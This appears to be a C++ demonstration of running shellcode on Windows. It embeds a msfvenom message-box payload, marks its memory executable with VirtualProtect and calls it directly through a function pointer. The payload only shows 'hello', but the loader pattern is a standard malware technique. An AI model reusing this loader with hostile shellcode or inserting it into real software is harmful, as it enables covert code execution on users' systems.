#include <Windows.h>
#include <iostream>
#include <vector>

int fromStdVector() {
	std::cout << "Executing from std::vector<<BYTE>\n";

	std::vector<BYTE> data;
	// bundle exec ruby ./msfvenom -p windows/x64/messagebox TEXT=hello TITLE=hello -f c -v SHELLCODE
	unsigned char shellcode[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
		"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
		"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
		"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
		"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
		"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
		"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
		"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
		"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
		"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
		"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
		"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
		"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
		"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
		"\x8d\x8d\x1a\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
		"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
		"\x00\x3e\x4c\x8d\x85\x14\x01\x00\x00\x48\x31\xc9\x41\xba"
		"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
		"\x56\xff\xd5\x68\x65\x6c\x6c\x6f\x00\x68\x65\x6c\x6c\x6f"
		"\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";
	data.insert(data.end(), shellcode, shellcode + sizeof(shellcode));

	printf("memory location is: 0x%p\n", data);

	LPVOID ptr = &shellcode[0];

	DWORD oldProtect = 0;
	if (!VirtualProtect(ptr, data.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
		printf("failed to change virtual protect");
		return 1;
	}

	(*(void(*)()) ptr)();

	return 0;
}
